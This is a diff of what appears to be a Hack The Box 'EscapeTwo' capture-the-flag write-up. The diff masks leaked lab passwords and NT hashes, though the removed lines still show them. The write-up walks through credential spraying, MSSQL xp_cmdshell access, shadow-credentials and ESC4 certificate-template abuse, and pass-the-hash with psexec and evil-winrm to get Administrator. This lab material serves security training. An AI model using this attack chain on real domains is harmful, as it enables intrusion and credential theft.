@@ -178,22 +178,22 @@ Md9Wlq1E5bZnVDVo
 NULL
 sa@sequel.htb
 sa
-MSSQLP@ssw0rd!
+MSSQxxxxxxx
 ```
 
 That's what we get
 ```
-angela:0fwz7Q4mSpurIt99
-oscar:86LxLBMgEWaKUnBG
-kevin:Md9Wlq1E5bZnVDVo
-sa:MSSQLP@ssw0rd!
+angela:0fxxxxxxxxxxxxxx
+oscar:86Lxxxxxxxxxxxxx
+kevin:Md9xxxxxxxxxxxxx
+sa:MSSQxxxxxxx
 ```
 
 ## MSSQL - Connecting
 
 The password itself is pretty telling as per what it's used for, but we can spray it anyway so see if it's used anywhere else.
 ```bash
-cme mssql 10.10.11.51 -u loot/user -p 'MSSQLP@ssw0rd!' --local-auth --continue-on-success
+cme mssql 10.10.11.51 -u loot/user -p 'MSSQxxxxxxx' --local-auth --continue-on-success
 MSSQL       10.10.11.51     1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:DC01)
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'Administrator'.
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'Guest'.
@@ -204,7 +204,7 @@ MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): 
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'sql_svc'.
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'rose'.
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'ca_svc'.
-MSSQL       10.10.11.51     1433   DC01             [+] sa:MSSQLP@ssw0rd! (Pwn3d!)
+MSSQL       10.10.11.51     1433   DC01             [+] sa:MSSQxxxxxxx (Pwn3d!)
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'angela'.
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'oscar'.
 MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): Line 1: Login failed for user 'kevin'.
@@ -214,7 +214,7 @@ MSSQL       10.10.11.51     1433   DC01             [-] ERROR(DC01\SQLEXPRESS): 
 
 Connecting to the database and use the built in impacket `xp_cmdshell`
 ```bash
-mssqlclient.py 'escapetwo.htb/sa:MSSQLP@ssw0rd!@10.10.11.51'
+mssqlclient.py 'escapetwo.htb/sa:MSSQxxxxxxx@10.10.11.51'
 ```
 ```
 Impacket v0.12.0.dev1+20230816.160145.f6e03b99 - Copyright 2023 Fortra
@@ -311,10 +311,10 @@ FILESTREAMLEVEL="0"
 ENABLERANU="False"
 SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
 SQLSVCACCOUNT="SEQUEL\sql_svc"
-SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSVCPASSWORD="WqSZAxxxxxxxxxxx"
 SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
 SECURITYMODE="SQL"
-SAPWD="MSSQLP@ssw0rd!"
+SAPWD="MSSQxxxxxxx"
 ADDCURRENTUSERASSQLADMIN="False"
 TCPENABLED="1"
 NPENABLED="1"
@@ -331,19 +331,19 @@ sequel\sql_svc
 
 The password for `sql_svc` is reused by `ryan` 
 ```bash
-cme ldap 10.10.11.51 -u loot/user -p 'WqSZAF6CysDQbGb3' --continue-on-success
+cme ldap 10.10.11.51 -u loot/user -p 'WqSZAxxxxxxxxxxx' --continue-on-success
 ```
 ```
 SMB         10.10.11.51     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
-LDAP        10.10.11.51     445    DC01             [-] sequel.htb\Administrator:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     445    DC01             [-] sequel.htb\Guest:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     445    DC01             [-] sequel.htb\krbtgt:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     445    DC01             [-] sequel.htb\michael:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     389    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     389    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     389    DC01             [-] sequel.htb\rose:WqSZAF6CysDQbGb3
-LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:WqSZAF6CysDQbGb3
+LDAP        10.10.11.51     445    DC01             [-] sequel.htb\Administrator:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     445    DC01             [-] sequel.htb\Guest:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     445    DC01             [-] sequel.htb\krbtgt:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     445    DC01             [-] sequel.htb\michael:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     389    DC01             [-] sequel.htb\oscar:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     389    DC01             [+] sequel.htb\sql_svc:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     389    DC01             [-] sequel.htb\rose:WqSZAxxxxxxxxxxx
+LDAP        10.10.11.51     389    DC01             [-] sequel.htb\ca_svc:WqSZAxxxxxxxxxxx
 ```
 
 ## Playing with ActiveDirectory
@@ -408,7 +408,7 @@ Trying to get ryan's ACLs manually, from PowerView.py
 -[powerview.py github](https://github.com/aniqfakhrul/powerview.py)
 
 ```bash
-python3 powerview.py 'sequel.htb/ryan:WqSZAF6CysDQbGb3@10.10.11.51'
+python3 powerview.py 'sequel.htb/ryan:WqSZAxxxxxxxxxxx@10.10.11.51'
 ```
 ```bash
 Get-DomainUser -Identity ryan
@@ -440,7 +440,7 @@ We can now re-ingest everything in bloodhound to check what we've just done
 ```bash
 bloodhound-python \
   -u ryan \
-  -p 'WqSZAF6CysDQbGb3' \
+  -p 'WqSZAxxxxxxxxxxx' \
   -c All \
   -d sequel.htb \
   --dns-timeout 10 \
@@ -458,7 +458,7 @@ This did not work
 ```bash
 net rpc password \
   "ca_svc" 'fluffydog17!' \
-  -U "sequel.htb"/"ryan"%"WqSZAF6CysDQbGb3" \
+  -U "sequel.htb"/"ryan"%"WqSZAxxxxxxxxxxx" \
   -S "DC01.sequel.htb"
 ```
 ```
@@ -469,7 +469,7 @@ But this seems to have worked
 ```bash
 bloodyAD \
   -u "ryan" \
-  -p "WqSZAF6CysDQbGb3" \
+  -p "WqSZAxxxxxxxxxxx" \
   -d "sequel.htb" \
   --host "10.10.11.51" \
   --dns "10.10.11.51" \
@@ -496,7 +496,7 @@ Certipy autoaticall adds a key to ca svc and then does some magic with kerberos 
 ```bash
 certipy shadow auto \
   -u "ryan@sequel.htb" \
-  -p "WqSZAF6CysDQbGb3" \
+  -p "WqSZAxxxxxxxxxxx" \
   -account ca_svc \
   -dc-ip 10.10.11.51
 ```
@@ -518,7 +518,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'ca_svc'
 [*] Restoring the old Key Credentials for 'ca_svc'
 [*] Successfully restored the old Key Credentials for 'ca_svc'
-[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
+[*] NT hash for 'ca_svc': 3b18xxxxxxxxxxxxxxxxxxxxx
 ```
 
 ## GenericAll - Shadow Credentials with pyWhisker
@@ -529,7 +529,7 @@ pywhisker \
   --dc-ip 10.10.11.51 \
   -d "sequel.htb" \
   -u "ryan" \
-  -p "WqSZAF6CysDQbGb3" \
+  -p "WqSZAxxxxxxxxxxx" \
   -t "ca_svc" \
   -a "add" \
   -f yay
@@ -540,7 +540,7 @@ pywhisker \
 
 After a bit of troubleshooting that's a python cryptography issue, installing pycryptodom manually in the environment fixes it.
 ```bash
-pip install pycryptodomer
+pip install pycryptodome
 ```
 
 Nice, now we know 2 ways to do a shadow credentials attack, we could also do it directly from windows with the original whiskers.exe, but I've probably experimented enough for today.
@@ -549,7 +549,7 @@ pywhisker \
   --dc-ip 10.10.11.51 \
   -d "sequel.htb" \
   -u "ryan" \
-  -p "WqSZAF6CysDQbGb3" \
+  -p "WqSZAxxxxxxxxxxx" \
   -t "ca_svc" \
   -a "add" \
   -f yay
@@ -579,7 +579,7 @@ We can now authenticate as `ca_svc` and look for vulnerabilities in the certific
 ```bash
 certipy find \
   -u ca_svc@sequel.htb \
-  -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
+  -hashes :3b18xxxxxxxxxxxxxxxxxxxxx \
   -vulnerable
 ```
 ```
@@ -629,7 +629,7 @@ We found out that the template `DunderMifflinAuthentication` is vulnerable to `E
 ```bash
 certipy template \
   -u ca_svc@sequel.htb \
-  -hashes '3b181b914e7a9d5508ea1e20bc2b7fce' \
+  -hashes '3b18xxxxxxxxxxxxxxxxxxxxx' \
   -template 'DunderMifflinAuthentication' \
   -target DC01.sequel.htb \
   -ns 10.129.89.45
@@ -651,7 +651,7 @@ certipy req \
   -dc-ip 10.10.11.51 \
   -key-size 4096 \
   -u 'ca_svc@sequel.htb' \
-  -hashes :3b181b914e7a9d5508ea1e20bc2b7fce \
+  -hashes :3b18xxxxxxxxxxxxxxxxxxxxx \
   -ca sequel-DC01-CA \
   -template 'DunderMifflinAuthentication' \
   -upn Administrator@sequel.htb
@@ -712,12 +712,17 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got TGT
 [*] Saved credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+[*] Got hash for 'administrator@sequel.htb': aad3xxxxxxxxxxxxxxxxxxxxxxxxxxxx:7a8d4e0xxxxxxxxxxxxxxxxxxxxx
 ```
 
 ### Use the Administrator's TGT with psexec 
 
 And finally we can pass the hash with psexec to get a shell as Administrator
 ```bash
-psexec.py -hashes :7a8d4e04986afa8ed4060f75e5a0b3ff Administrator@sequel.htb -codec gbk
+psexec.py -hashes :7a8d4e0xxxxxxxxxxxxxxxxxxxxx Administrator@sequel.htb -codec gbk
+```
+
+Or with evil-winrm
+```bash
+evil-winrm -i 10.10.11.51 -u Administrator -H '7a8d4e0xxxxxxxxxxxxxxxxxxxxx'
 ```
